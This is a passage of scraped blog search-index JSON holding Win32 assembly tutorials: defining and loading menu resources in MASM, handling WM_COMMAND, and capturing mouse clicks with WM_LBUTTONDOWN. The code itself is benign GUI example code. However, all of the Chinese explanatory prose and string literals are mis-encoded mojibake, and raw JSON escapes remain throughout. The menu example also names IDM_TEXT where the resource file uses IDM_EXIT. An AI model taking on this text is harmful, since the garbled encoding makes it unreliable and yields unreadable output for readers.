‡å‡†.è­¬å¦‚:ä¸€èˆ¬å¤´ä¸¤ä¸ªèœå•é¡¹æ˜¯\u0026quot;File\u0026quot;å’Œ\u0026quot;Edit\u0026quot;,æœ€åæ˜¯\u0026quot;Help\u0026quot;,æ‚¨å¯ä»¥åœ¨è¿™ä¸­é—´æ’å…¥æ‚¨è¦å®šä¹‰çš„èœå•é¡¹.å¦‚æœæ‰€è¿è¡Œçš„èœå•å‘½ä»¤ä¼šå¼¹å‡ºä¸€ä¸ªå¯¹è¯æ¡†,é‚£ä¹ˆå°±è¦åœ¨è¯¥èœå•é¡¹ååŠ å…¥çœç•¥ç¬¦(\u0026hellip;).èœå•æ˜¯ä¸€ç§èµ„æº,é™¤èœå•å¤–è¿˜æœ‰å…¶å®ƒåƒå¯¹è¯æ¡†,å­—ç¬¦ä¸²,å›¾æ ‡,ä½å›¾èµ„æºç­‰.åœ¨é“¾æ¥æ—¶é“¾æ¥ç¨‹åºå°†æŠŠèµ„æºåŠ å…¥åˆ°å¯æ‰§è¡Œç¨‹åºä¸­å»,æœ€åæˆ‘ä»¬çš„æ‰§è¡Œç¨‹åºä¸­å°±æ—¢åŒ…æ‹¬æœºå™¨æŒ‡ä»¤åˆåŒ…æ‹¬äº†èµ„æº. æ‚¨å¯ä»¥åœ¨ä»»ä½•æ–‡æœ¬ç¼–è¾‘å™¨ä¸­ç¼–å†™è„šæœ¬æ–‡ä»¶,åœ¨æ–‡ä»¶ä¸­æ‚¨å¯ä»¥æŒ‡å®šèµ„æºå‘ˆç°å‡ºæ¥çš„å¤–è§‚å’Œå…¶å®ƒçš„ä¸€äº›å±æ€§.å½“ç„¶æ›´ç›´è§‚çš„æ–¹æ³•æ˜¯ç”¨èµ„æºç¼–è¾‘å™¨,é€šå¸¸èµ„æºç¼–è¾‘å™¨éƒ½æ‰“åŒ…åœ¨ç¼–è¯‘ç¯å¢ƒä¸­,åƒVisual C++å¸¦äº†èµ„æºç¼–è¾‘å™¨. æˆ‘ä»¬å¯ä»¥æŒ‰ä»¥ä¸‹æ–¹å¼æ¥å®šä¹‰ä¸€ä¸ªèœå•èµ„æºï¼š\n1 2 3 4 MyMenu MENU { [menu list here] } è¿™å’ŒCè¯­è¨€ä¸­çš„ç»“æ„ä½“çš„å®šä¹‰éå¸¸ç›¸ä¼¼ã€‚ MyMenuç±»ä¼¼äºè¢«å®šä¹‰çš„å˜é‡ï¼Œè€ŒMENUåˆ™ç±»ä¼¼äºå…³é”®å­—ã€‚å½“ç„¶æ‚¨å¯ä»¥ç”¨å¦å¤–ä¸€ç§åŠæ³•ï¼Œé‚£å°±æ˜¯ç”¨BEGINå’ŒENDæ¥ä»£æ›¿èŠ±æ‹¬å·ï¼Œè¿™å’ŒPASCALè¯­è¨€ä¸­çš„é£æ ¼ç›¸åŒã€‚ åœ¨èœå•é¡¹çš„åˆ—è¡¨ä¸­æ˜¯ä¸€å¤§ä¸²çš„MENUITEMå’ŒPOPUPè¯­å¥ã€‚MENUITEMå®šä¹‰äº†ä¸€ä¸ªèœå•é¡¹ï¼Œå½“é€‰æ‹©åä¸ä¼šæ¿€æ´»å¯¹è¯æ¡†ã€‚å®ƒçš„è¯­æ³•å¦‚ä¸‹ï¼š\n1 MENUITEM \u0026#34;\u0026amp;text\u0026#34;, ID [,options] å®ƒç”±å…³é”®å­—MENUITEMå¼€å¤´ï¼Œç´§è·Ÿåœ¨MENUITEMåçš„æ˜¯æŒ‡èœå•é¡¹çš„åç§°å­—ç¬¦ä¸²ï¼Œç¬¦å·â€œ\u0026amp;â€œåçš„ç¬¬ä¸€ä¸ªå­—ç¬¦å°†ä¼šå¸¦ä¸‹åˆ’çº¿ï¼Œå®ƒä¹Ÿæ˜¯è¯¥èœå•é¡¹çš„å¿«æ·é”®ã€‚IDçš„ä½œç”¨å½“è¯¥èœå•è¢«é€‰ä¸­æ—¶ï¼ŒWINDOWSçš„æ¶ˆæ¯å¤„ç†è¿‡ç¨‹ç”¨æ¥åŒºåˆ†èœå•é¡¹ç”¨çš„ã€‚æ¯«æ— ç–‘é—®ï¼ŒIDå·å¿…é¡»å”¯ä¸€ã€‚ optionsæœ‰ä»¥ä¸‹å¯ä¾›é€‰æ‹©çš„å±æ€§ï¼š\nGRAYED ä»£è¡¨è¯¥èœå•é¡¹å¤„äºéæ¿€æ´»çŠ¶æ€ï¼Œå³å½“å…¶è¢«é€‰ä¸­æ—¶ä¸ä¼šäº§ç”Ÿ WM_COMMAND æ¶ˆæ¯ã€‚è¯¥èœå•ä»¥ç°è‰²æ˜¾ç¤ºã€‚ INACTIVE ä»£è¡¨è¯¥èœå•é¡¹å¤„äºéæ¿€æ´»çŠ¶æ€ï¼Œå³å½“å…¶è¢«é€‰ä¸­æ—¶ä¸ä¼šäº§ç”Ÿ WM_COMMAND æ¶ˆæ¯ã€‚è¯¥èœå•ä»¥æ­£å¸¸é¢œè‰²æ˜¾ç¤ºã€‚ MENUBREAK è¯¥èœå•é¡¹å’Œéšåçš„èœå•é¡¹ä¼šæ˜¾ç¤ºåœ¨æ–°åˆ—ä¸­ã€‚ HELP è¯¥èœå•é¡¹å’Œéšåçš„èœå•é¡¹å³å¯¹é½ã€‚ POPUPçš„è¯­æ³•å¦‚ä¸‹ï¼š\n1 2 3 4 POPUP \u0026#34;\u0026amp;text\u0026#34; [,options] { [menu list] } POPUPå®šä¹‰äº†ä¸€ä¸ªèœå•é¡¹å½“è¯¥èœå•é¡¹è¢«é€‰ä¸­æ—¶åˆä¼šå¼¹å‡ºä¸€ä¸ªå­èœå•ã€‚ å¦å¤–æœ‰ä¸€ç§ç‰¹åˆ«ç±»å‹çš„MENUITEMè¯­å¥ MENUITEM SEPARATORï¼Œå®ƒè¡¨ç¤ºåœ¨èœå•é¡¹ä½ç½®ç”»ä¸€æ¡åˆ†éš”çº¿ã€‚å®šä¹‰å®Œèœå•åï¼Œæ‚¨å°±å¯ä»¥åœ¨ç¨‹åºä¸­ä½¿ç”¨è„šæœ¬ä¸­å®šä¹‰çš„èœå•èµ„æºäº†ã€‚æ‚¨å¯ä»¥åœ¨ç¨‹åºçš„ä¸¤ä¸ªåœ°æ–¹ï¼ˆæˆ–å«åšç”¨ä¸¤ç§æ–¹å¼ï¼‰ä½¿ç”¨å®ƒä»¬ï¼š\nåœ¨ WNDCLASSEXç»“æ„ä½“çš„æˆå‘˜ lpszMenuNameä¸­ã€‚è­¬å¦‚ï¼Œæ‚¨æœ‰ä¸€ä¸ªèœå•â€œFirstMenuâ€œï¼Œæ‚¨å¯ä»¥æŒ‰å¦‚ä¸‹æ–¹æ³•æŠŠå®ƒè”ç³»åˆ°æ‚¨çš„çª—å£ï¼š 1 2 3 4 5 6 7 8 .DATA MenuName db \u0026#34;FirstMenu\u0026#34;,0 ........................... ........................... .CODE ........................... mov wc.lpszMenuName, OFFSET MenuName ........................... åœ¨ CreateWindowExå‡½æ•°ä¸­æŒ‡æ˜èœå•çš„å¥æŸ„ï¼š 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 .DATA MenuName db \u0026#34;FirstMenu\u0026#34;,0 hMenu HMENU ? ........................... ........................... .CODE ........................... invoke LoadMenu, hInst, OFFSET MenuName mov hMenu, eax invoke CreateWindowEx,NULL,OFFSET ClsName,\\ OFFSET Caption, WS_OVERLAPPEDWINDOW,\\ CW_USEDEFAULT,CW_USEDEFAULT,\\ CW_USEDEFAULT,CW_USEDEFAULT,\\ NULL,\\ hMenu,\\ hInst,\\ NULL\\ ........................... æ‚¨ä¹Ÿè®¸ä¼šé—®ï¼Œè¿™ä¸¤ç€ä¹‹é—´æœ‰ä»€ä¹ˆä¸åŒå‘¢ï¼Ÿ**å½“æ‚¨ç”¨ç¬¬ä¸€ç§æ–¹æ³•æ—¶ï¼Œç”±äºæ˜¯åœ¨çª—å£ç±»ä¸­æŒ‡å®šï¼Œæ•…æ‰€æœ‰ç”±è¯¥çª—å£ç±»æ´¾ç”Ÿçš„çª—å£éƒ½å°†æœ‰ç›¸åŒçš„èœå•ã€‚å¦‚æœæ‚¨æƒ³è¦ä»ç›¸åŒçš„ç±»ä¸­æ´¾ç”Ÿçš„çª—å£æœ‰ä¸åŒçš„èœå•é‚£å°±è¦ä½¿ç”¨ç¬¬äºŒä¸­æ–¹æ³•ï¼Œè¯¥æ–¹æ³•ä¸­é€šè¿‡å‡½æ•° CreateWindowExæŒ‡å®šçš„èœå•ä¼šâ€œè¦†ç›–â€ WNDCLASSEXç»“æ„ä½“ä¸­æŒ‡å®šçš„èœå•ã€‚**æ¥ä¸‹æ¥æˆ‘ä»¬çœ‹çœ‹å½“ç”¨æˆ·é€‰æ‹©äº†ä¸€ä¸ªèœå•é¡¹æ—¶å®ƒæ˜¯å¦‚ä½•é€šçŸ¥WINDOWS çª—å£è¿‡ç¨‹çš„ï¼šå½“ç”¨æˆ·é€‰æ‹©äº†ä¸€ä¸ªèœå•é¡¹æ—¶ï¼ŒWINDOWSçª—å£è¿‡ç¨‹ä¼šæ¥æ”¶åˆ°ä¸€ä¸ª WM_COMMANDæ¶ˆæ¯ï¼Œä¼ è¿›æ¥çš„å‚æ•° wParamçš„ä½å­—èŠ‚åŒ…å«äº†èœå•é¡¹çš„ IDå·ã€‚å¥½äº†ï¼Œä¸Šé¢å°±æ˜¯å…³äºèœå•é¡¹çš„ä¸€åˆ‡ï¼Œä¸‹é¢æˆ‘ä»¬å°±æ¥å®è·µã€‚\nä¾‹å­ï¼š ç¬¬ä¸€ä¸ªä¾‹å­æ˜¾ç¤ºäº†æŒ‡å®šä¸€ä¸ªèœå•é¡¹çš„ç¬¬ä¸€ç§æ–¹æ³•ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 .386 .model flat,stdcall option casemap:none WinMain proto :DWORD,:DWORD,:DWORD,:DWORD include windows.inc include user32.inc include kernel32.inc includelib user32.lib includelib kernel32.lib .data ClassName db \u0026#34;SimpleWinClass\u0026#34;,0 AppName db \u0026#34;Our Sixth Window\u0026#34;,0 MenuName db \u0026#34;FirstMenu\u0026#34;,0 Test_string db \u0026#34;ä½ é€‰æ‹©äº†æµ‹è¯•èœå•é¡¹\u0026#34;,0 Hello_string db \u0026#34;ä½ å¥½\u0026#34;,0 Goodbye_string db \u0026#34;å†è§\u0026#34;,0 .data? hInstance HINSTANCE ? CommandLine LPSTR ? .const IDM_TEST equ 1 IDM_HELLO equ 2 IDM_GOODBYE equ 3 IDM_TEXT equ 4 .code start: invoke GetModuleHandle,NULL mov hInstance,eax invoke GetCommandLine mov CommandLine,eax invoke WinMain,hInstance,NULL,CommandLine,SW_SHOWDEFAULT invoke ExitProcess,eax WinMain proc hInst:HINSTANCE,hPrevInst:HINSTANCE,CmdLine:LPSTR,CmdShow:DWORD LOCAL wc:WNDCLASSEX LOCAL msg:MSG LOCAL hwnd:HWND mov wc.cbSize,SIZEOF WNDCLASSEX mov wc.style,CS_HREDRAW or CS_VREDRAW mov wc.lpfnWndProc, offset WndProc mov wc.cbClsExtra,NULL mov wc.cbWndExtra,NULL push hInst pop wc.hInstance mov wc.hbrBackground,COLOR_WINDOW+1 mov wc.lpszMenuName,offset MenuName mov wc.lpszClassName,offset ClassName invoke LoadIcon,NULL,IDI_APPLICATION mov wc.hIcon,eax mov wc.hIconSm,eax invoke LoadCursor,NULL,IDC_ARROW mov wc.hCursor,eax invoke RegisterClassEx,addr wc invoke CreateWindowEx,NULL,addr ClassName,addr AppName,WS_OVERLAPPEDWINDOW,CW_USEDEFAULT,CW_USEDEFAULT,CW_USEDEFAULT,CW_USEDEFAULT,NULL,NULL,hInst,NULL mov hwnd,eax invoke ShowWindow,hwnd,SW_SHOWNORMAL invoke UpdateWindow,hwnd .while TRUE invoke GetMessage,addr msg,NULL,0,0 .break .if (!eax) invoke DispatchMessage,addr msg\t.endw mov eax,msg.wParam ret WinMain endp WndProc proc hWnd:HWND,uMsg:UINT,wParam:WPARAM,lParam:LPARAM .if uMsg==WM_DESTROY invoke PostQuitMessage,NULL .elseif uMsg==WM_COMMAND mov eax,wParam .if ax==IDM_TEST invoke MessageBox,NULL,addr Test_string,offset AppName,MB_OK .elseif ax==IDM_HELLO invoke MessageBox,NULL,addr Hello_string,offset AppName,MB_OK .elseif ax==IDM_GOODBYE invoke MessageBox,NULL,addr Goodbye_string,offset AppName,MB_OK .else invoke DestroyWindow,hWnd .endif .else invoke DefWindowProc,hWnd,uMsg,wParam,lParam ret .endif xor eax,eax ret WndProc endp end start Menu.rc\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 #define IDM_TEST 1 #define IDM_HELLO 2 #define IDM_GOODBYE 3 #define IDM_EXIT 4 FirstMenu MENU { POPUP \u0026#34;\u0026amp;PopUp\u0026#34; { MENUITEM \u0026#34;\u0026amp;Say Hello\u0026#34;,IDM_HELLO MENUITEM \u0026#34;Say \u0026amp;GoodBye\u0026#34;, IDM_GOODBYE MENUITEM SEPARATOR MENUITEM \u0026#34;E\u0026amp;xit\u0026#34;,IDM_EXIT } MENUITEM \u0026#34;\u0026amp;Test\u0026#34;, IDM_TEST } åˆ†æ: æˆ‘ä»¬å…ˆæ¥åˆ†æèµ„æºæ–‡ä»¶ï¼š\n1 2 3 4 #define IDM_TEST 1 /* equal to IDM_TEST equ 1*/ #define IDM_HELLO 2 #define IDM_GOODBYE 3 #define IDM_EXIT 4 ä¸Šé¢çš„å‡ è¡Œå®šä¹‰äº†èœå•é¡¹çš„IDå·ã€‚åªè¦æ³¨æ„èœå•é¡¹IDå·å¿…é¡»å”¯ä¸€å¤–ï¼Œæ‚¨å¯ä»¥ç»™IDå·ä»»ä½•å€¼ã€‚\n1 FirstMenu MENU ç”¨å…³é”®å­—MENUå®šä¹‰èœå•ã€‚\n1 2 3 4 5 6 7 POPUP \u0026#34;\u0026amp;PopUp\u0026#34; { MENUITEM \u0026#34;\u0026amp;Say Hello\u0026#34;,IDM_HELLO MENUITEM \u0026#34;Say \u0026amp;GoodBye\u0026#34;, IDM_GOODBYE MENUITEM SEPARATOR MENUITEM \u0026#34;E\u0026amp;xit\u0026#34;,IDM_EXIT } å®šä¹‰ä¸€ä¸ªæœ‰å››ä¸ªèœå•é¡¹çš„å­èœå•ï¼Œå…¶ä¸­ç¬¬ä¸‰ä¸ªèœå•é¡¹æ˜¯ä¸€ä¸ªåˆ†éš”çº¿ã€‚\n1 MENUITEM \u0026#34;\u0026amp;Test\u0026#34;, IDM_TEST å®šä¹‰ä¸»èœå•ä¸­çš„ä¸€é¡¹ã€‚ä¸‹é¢æˆ‘ä»¬æ¥çœ‹çœ‹æºä»£ç ã€‚\n1 2 3 4 MenuName db \u0026#34;FirstMenu\u0026#34;,0 Test_string db \u0026#34;ä½ é€‰æ‹©äº†æµ‹è¯•èœå•é¡¹\u0026#34;,0 Hello_string db \u0026#34;ä½ å¥½\u0026#34;,0 Goodbye_string db \u0026#34;å†è§\u0026#34;,0 MenuNameæ˜¯èµ„æºæ–‡ä»¶ä¸­æŒ‡å®šçš„èœå•çš„åå­—ã€‚å› ä¸ºæ‚¨å¯ä»¥åœ¨è„šæœ¬æ–‡ä»¶ä¸­å®šä¹‰ä»»æ„å¤šä¸ªèœå•ï¼Œæ‰€ä»¥åœ¨ä½¿ç”¨å‰å¿…é¡»æŒ‡å®šæ‚¨è¦ä½¿ç”¨é‚£ä¸€ä¸ªï¼Œæ¥ä¸‹æ¥çš„è¡Œæ˜¯åœ¨é€‰ä¸­èœå•é¡¹æ—¶æ˜¾ç¤ºåœ¨ç›¸å…³å¯¹è¯æ¡†ä¸­çš„å­—ç¬¦ä¸²ã€‚\n1 2 3 4 IDM_TEST equ 1 IDM_HELLO equ 2 IDM_GOODBYE equ 3 IDM_EXIT equ 4 å®šä¹‰ç”¨åœ¨WINDOWSçª—å£è¿‡ç¨‹ä¸­çš„èœå•é¡¹IDå·ã€‚è¿™äº›å€¼å¿…é¡»å’Œè„šæœ¬æ–‡ä»¶ä¸­çš„ç›¸åŒã€‚\n1 2 3 4 5 6 7 8 9 10 11 .ELSEIF uMsg==WM_COMMAND mov eax,wParam .IF ax==IDM_TEST invoke MessageBox,NULL,ADDR Test_string,OFFSET AppName,MB_OK .ELSEIF ax==IDM_HELLO invoke MessageBox, NULL,ADDR Hello_string, OFFSET AppName,MB_OK .ELSEIF ax==IDM_GOODBYE invoke MessageBox,NULL,ADDR Goodbye_string, OFFSET AppName, MB_OK .ELSE invoke DestroyWindow,hWnd .ENDIF åœ¨æœ¬çª—å£è¿‡ç¨‹ä¸­æˆ‘ä»¬å¤„ç†WM_COMMANDæ¶ˆæ¯ã€‚å½“ç”¨æˆ·é€‰æ‹©äº†ä¸€ä¸ªèœå•é¡¹æ—¶ï¼Œè¯¥èœå•é¡¹çš„IDæ”¾å…¥å‚æ•°wParamä¸­è¢«åŒæ—¶é€åˆ°WINDOWSçš„çª—å£è¿‡ç¨‹ï¼Œæˆ‘ä»¬æŠŠå®ƒä¿å­˜åˆ°eaxå¯„å­˜å™¨ä¸­ä»¥ä¾¿å’Œé¢„å®šä¹‰çš„èœå•é¡¹IDæ¯”è¾ƒç”¨ã€‚å‰ä¸‰ç§æƒ…å†µä¸‹ï¼Œå½“æˆ‘ä»¬é€‰ä¸­Testã€Say Helloã€Say GoodByeèœå•é¡¹æ—¶ï¼Œä¼šå¼¹å‡ºä¸€ä¸ªå¯¹è¯æ¡†å…¶ä¸­æ˜¾ç¤ºä¸€ä¸ªç›¸å…³çš„å­—ç¬¦ä¸²ï¼Œé€‰æ‹©Exitèœå•é¡¹æ—¶ï¼Œæˆ‘ä»¬å°±è°ƒç”¨å‡½æ•°DestroyWindowï¼Œå…¶ä¸­çš„å‚æ•°æ˜¯æˆ‘ä»¬çª—å£çš„å¥æŸ„ï¼Œè¿™æ ·å°±é”€æ¯äº†çª—å£ã€‚å°±åƒæ‚¨æ‰€çœ‹åˆ°çš„ï¼Œé€šè¿‡åœ¨ä¸€ä¸ªçª—å£ç±»ä¸­æŒ‡å®šèœå•åçš„æ–¹æ³•æ¥ç»™ä¸€ä¸ªåº”ç”¨ç¨‹åºç”Ÿæˆä¸€ä¸ªèœå•æ˜¯ç®€å•è€Œç›´è§‚çš„ã€‚é™¤æ­¤æ–¹æ³•å¤–æ‚¨è¿˜å¯ä»¥ç”¨å¦ä¸€ç§æ–¹æ³•ï¼Œå…¶ä¸­èµ„æºæ–‡ä»¶æ˜¯ä¸€æ ·çš„ï¼Œæºæ–‡ä»¶ä¸­ä¹Ÿåªæœ‰å°‘æ•°çš„æ”¹åŠ¨ï¼Œè¿™äº›æ”¹åŠ¨å¦‚ä¸‹ï¼š\n1 2 3 4 .data? hInstance HINSTANCE ? CommandLine LPSTR ? hMenu HMENU ? ; handle of our menu å®šä¹‰äº†ä¸€ä¸ªå˜é‡æ¥ä¿å­˜æˆ‘ä»¬çš„èœå•çš„å¥æŸ„ï¼Œç„¶åï¼š\n1 2 3 4 5 6 invoke LoadMenu, hInst, OFFSET MenuName mov hMenu,eax INVOKE CreateWindowEx,NULL,ADDR ClassName,ADDR AppName,\\ WS_OVERLAPPEDWINDOW,CW_USEDEFAULT,\\ CW_USEDEFAULT,CW_USEDEFAULT,CW_USEDEFAULT,NULL,hMenu,\\ hInst,NULL è°ƒç”¨LoadMenuå‡½æ•°ï¼Œè¯¥å‡½æ•°éœ€è¦å®ä¾‹å¥æŸ„å’Œèœå•åçš„å­—ç¬¦ä¸²ï¼Œè°ƒç”¨çš„ç»“æœè¿”å›æŒ‡å‘èœå•çš„å¥æŸ„ï¼Œç„¶åä¼ ç»™å‡½æ•°CreateWindowExåˆšè¿”å›çš„èœå•å¥æŸ„å°±å¯ä»¥äº†ã€‚\n","permalink":"https://www.hacktech.cn/post/win32-asm-study-8.html","summary":"\u003cp\u003eè¿™æ¬¡æˆ‘ä»¬å°†åœ¨æˆ‘ä»¬çš„åº”ç”¨ç¨‹åºä¸­åŠ å…¥ä¸€ä¸ªèœå•ã€‚\u003c/p\u003e","title":"Win32æ±‡ç¼–å­¦ä¹ (8)ï¼šèœå•"},{"content":"Size operator Registers Data directives Conditions(jmpåŠ©è®°ç¬¦) ","permalink":"https://www.hacktech.cn/post/fasm-study-20180210.html","summary":"\u003ch2 id=\"size-operator\"\u003eSize operator\u003c/h2\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"https://raw.githubusercontent.com/akkuman/pic/master/pic/2021/8/30e377ab39aec9010ed3f547bbde35b3..png\" alt=\"enter description here\"  /\u003e\n\u003c/p\u003e\n\u003ch2 id=\"registers\"\u003eRegisters\u003c/h2\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"https://raw.githubusercontent.com/akkuman/pic/master/pic/2021/8/b17f82d27949683225162707c22a117b..png\" alt=\"enter description here\"  /\u003e\n\u003c/p\u003e\n\u003ch2 id=\"data-directives\"\u003eData directives\u003c/h2\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"https://raw.githubusercontent.com/akkuman/pic/master/pic/2021/8/2f10467c27aa8664da9615c501b8fb9f..png\" alt=\"enter description here\"  /\u003e\n\u003c/p\u003e\n\u003ch2 id=\"conditionsjmpåŠ©è®°ç¬¦\"\u003eConditions(jmpåŠ©è®°ç¬¦)\u003c/h2\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"https://raw.githubusercontent.com/akkuman/pic/master/pic/2021/8/fd3b24b8e19ab9fec4cdf4d5bc4937ea..png\" alt=\"enter description here\"  /\u003e\n\u003c/p\u003e","title":"FASMå­¦ä¹ ä¸­çš„ä¸€äº›è¡¨æ ¼\""},{"content":"è¿™æ¬¡æˆ‘ä»¬å°†å­¦ä¹ å¦‚ä½•åœ¨æˆ‘ä»¬çš„çª—å£è¿‡ç¨‹å‡½æ•°ä¸­å¤„ç†é¼ æ ‡æŒ‰é”®æ¶ˆæ¯ã€‚ä¾‹å­æ¼”ç¤ºäº†å¦‚ä½•ç­‰å¾…é¼ æ ‡å·¦é”®æŒ‰ä¸‹æ¶ˆæ¯ï¼Œæˆ‘ä»¬å°†åœ¨æŒ‰ä¸‹çš„ä½ç½®æ˜¾ç¤ºä¸€ä¸ªå­—ç¬¦ä¸²ã€‚\nç†è®ºï¼š å’Œå¤„ç†é”®ç›˜è¾“å…¥ä¸€æ ·ï¼ŒWINDOWSå°†æ•æ‰é¼ æ ‡åŠ¨ä½œå¹¶æŠŠå®ƒä»¬å‘é€åˆ°ç›¸å…³çª—å£ã€‚è¿™äº›æ´»åŠ¨åŒ…æ‹¬å·¦ã€å³é”®æŒ‰ä¸‹ã€ç§»åŠ¨ã€åŒå‡»ã€æ»šè½®æ¶ˆæ¯WM_WHEELç­‰ã€‚WINDOWSå¹¶ä¸åƒå¤„ç†é”®ç›˜è¾“å…¥é‚£æ ·æŠŠæ‰€æœ‰çš„é¼ æ ‡æ¶ˆæ¯éƒ½å¯¼å‘æœ‰è¾“å…¥ç„¦ç‚¹çš„çª—å£ï¼Œä»»ä½•é¼ æ ‡ç»è¿‡çš„çª—å£éƒ½å°†æ¥æ”¶åˆ°é¼ æ ‡æ¶ˆæ¯ï¼Œæ— è®ºæœ‰å¦è¾“å…¥ç„¦ç‚¹ã€‚å¦å¤–ï¼Œçª—å£è¿˜ä¼šæ¥æ”¶åˆ°é¼ æ ‡åœ¨éå®¢æˆ·åŒºç§»åŠ¨çš„æ¶ˆæ¯ï¼ˆWM_NCMOVEï¼‰ï¼Œä½†å¤§å¤šæ•°çš„æƒ…å†µä¸‹æˆ‘ä»¬éƒ½ä¼šå°†å…¶å¿½ç•¥æ‰ã€‚å½“é¼ æ ‡åœ¨æŸçª—å£å®¢æˆ·åŒºç§»åŠ¨æ—¶ï¼Œè¯¥çª—å£å°†æ¥æ”¶åˆ°WM_MOUSEMOVEæ¶ˆæ¯ã€‚ä¸€ä¸ªçª—å£è‹¥æƒ³å¤„ç†WM_LBUTTONDBCLKæˆ– WM_RBUTTONDBCLKï¼Œé‚£ä¹ˆå®ƒçš„çª—å£ç±»å¿…é¡»æœ‰CS_DBLCLKSé£æ ¼ï¼Œå¦åˆ™å®ƒå°±ä¼šæ¥å—åˆ°ä¸€å †çš„æŒ‰é”®èµ·è½ï¼ˆWM_XBUTTONDOWNæˆ–WM_XBUTTONUP)çš„æ¶ˆæ¯ã€‚ å¯¹äºæ‰€æœ‰çš„æ¶ˆæ¯ï¼Œçª—å£è¿‡ç¨‹å‡½æ•°ä¼ å…¥çš„å‚æ•°lParamåŒ…å«äº†é¼ æ ‡çš„ä½ç½®ï¼Œå…¶ä¸­ä½ä½ä¸ºxåæ ‡ï¼Œé«˜ä½ä¸ºyåæ ‡ï¼Œè¿™äº›åæ ‡å€¼éƒ½æ˜¯ç›¸å¯¹äºçª—å£å®¢æˆ·åŒºçš„å·¦ä¸Šè§’çš„å€¼ï¼ŒwParamä¸­åˆ™åŒ…å«äº†é¼ æ ‡æŒ‰é’®çš„çŠ¶æ€ã€‚\nä¾‹å­ï¼š 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 .386 .model flat,stdcall option casemap:none WinMain proto :DWORD,:DWORD,:DWORD,:DWORD include \\masm32\\include\\windows.inc include \\masm32\\include\\user32.inc include \\masm32\\include\\kernel32.inc include \\masm32\\include\\gdi32.inc includelib \\masm32\\lib\\user32.lib includelib \\masm32\\lib\\kernel32.lib includelib \\masm32\\lib\\gdi32.lib .data ClassName db \u0026#34;SimpleWinClass\u0026#34;,0 AppName db \u0026#34;Our First Window\u0026#34;,0 MouseClick db 0 .data? hInstance HINSTANCE ? CommandLine LPSTR ? hitpoint POINT \u0026lt;\u0026gt; .code start: invoke GetModuleHandle, NULL mov hInstance,eax invoke GetCommandLine mov CommandLine,eax invoke WinMain, hInstance,NULL,CommandLine, SW_SHOWDEFAULT invoke ExitProcess,eax WinMain proc hInst:HINSTANCE,hPrevInst:HINSTANCE,CmdLine:LPSTR,CmdShow:DWORD LOCAL wc:WNDCLASSEX LOCAL msg:MSG LOCAL hwnd:HWND mov wc.cbSize,SIZEOF WNDCLASSEX mov wc.style, CS_HREDRAW or CS_VREDRAW mov wc.lpfnWndProc, OFFSET WndProc mov wc.cbClsExtra,NULL mov wc.cbWndExtra,NULL push hInst pop wc.hInstance mov wc.hbrBackground,COLOR_WINDOW+1 mov wc.lpszMenuName,NULL mov wc.lpszClassName,OFFSET ClassName invoke LoadIcon,NULL,IDI_APPLICATION mov wc.hIcon,eax mov wc.hIconSm,eax invoke LoadCursor,NULL,IDC_ARROW mov wc.hCursor,eax invoke RegisterClassEx, addr wc invoke CreateWindowEx,NULL,ADDR ClassName,ADDR AppName,\\ WS_OVERLAPPEDWINDOW,CW_USEDEFAULT,\\ CW_USEDEFAULT,CW_USEDEFAULT,CW_USEDEFAULT,NULL,NULL,\\ hInst,NULL mov hwnd,eax invoke ShowWindow, hwnd,SW_SHOWNORMAL invoke UpdateWindow, hwnd .WHILE TRUE invoke GetMessage, ADDR msg,NULL,0,0 .BREAK .IF (!eax) invoke DispatchMessage, ADDR msg .ENDW mov eax,msg.wParam ret WinMain endp WndProc proc hWnd:HWND, uMsg:UINT, wParam:WPARAM, lParam:LPARAM LOCAL hdc:HDC LOCAL ps:PAINTSTRUCT .IF uMsg==WM_DESTROY invoke PostQuitMessage,NULL .ELSEIF uMsg==WM_LBUTTONDOWN mov eax,lParam and eax,0FFFFh mov hitpoint.x,eax mov eax,lParam shr eax,16 mov hitpoint.y,eax mov MouseClick,TRUE invoke InvalidateRect,hWnd,NULL,TRUE .ELSEIF uMsg==WM_PAINT invoke BeginPaint,hWnd, ADDR ps mov hdc,eax .IF MouseClick invoke lstrlen,ADDR AppName invoke TextOut,hdc,hitpoint.x,hitpoint.y,ADDR AppName,eax .ENDIF invoke EndPaint,hWnd, ADDR ps .ELSE invoke DefWindowProc,hWnd,uMsg,wParam,lParam ret .ENDIF xor eax,eax ret WndProc endp end start åˆ†æï¼š 1 2 3 4 5 6 7 8 9 .ELSEIF uMsg==WM_LBUTTONDOWN mov eax,lParam and eax,0FFFFh mov hitpoint.x,eax mov eax,lParam shr eax,16 mov hitpoint.y,eax mov MouseClick,TRUE invoke InvalidateRect,hWnd,NULL,TRUE çª—å£è¿‡ç¨‹å¤„ç†äº†WM_LBUTTONDOWNæ¶ˆæ¯ï¼Œå½“æ¥æ”¶åˆ°è¯¥æ¶ˆæ¯æ—¶ï¼ŒlParamä¸­åŒ…å«äº†ç›¸å¯¹äºçª—å£å®¢æˆ·åŒºå·¦ä¸Šè§’çš„åæ ‡ï¼Œæˆ‘ä»¬æŠŠå®ƒä¿å­˜ä¸‹æ¥ï¼Œæ”¾åˆ°ä¸€ä¸ªç»“æ„ä½“å˜é‡ï¼ˆPOINTï¼‰ä¸­ï¼Œè¯¥ç»“æ„ä½“å˜é‡çš„å®šä¹‰å¦‚ä¸‹ï¼š\n1 2 3 4 POINT STRUCT x dd ? y dd ? POINT ENDS ç„¶åæˆ‘ä»¬æŠŠæ 